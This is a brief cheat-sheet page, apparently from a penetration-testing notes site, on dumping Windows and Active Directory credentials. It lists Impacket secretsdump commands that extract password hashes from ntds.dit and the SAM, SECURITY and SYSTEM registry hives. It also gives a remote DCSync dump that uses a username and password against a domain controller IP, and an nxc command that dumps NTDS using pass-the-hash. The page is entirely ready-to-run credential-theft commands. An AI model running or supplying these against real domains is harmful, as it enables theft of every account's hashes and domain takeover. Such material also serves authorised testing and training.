---
title: "secretsdump"
date: 2024-7-2
tags: ["secretsdump", "impacket", "active directory", "ad", "domain controller", "Windows", "ntds.dit", "hive", "hashes", "nxc"]
---

---
### Impacket

[Download Impacket](https://github.com/fortra/impacket)

### secretsdump

#### With ntds.dit and SYSTEM hive

```bash
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

#### With SAM, SYSTEM and SECURITY Hives

```bash
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```

#### With dcsync right

```bash
impacket-secretsdump username:password@10.10.11.10
```

### nxc

```bash
nxc smb -dc-ip <DC> -u <USERNAME> -H <HASH> --ntds
```

<br>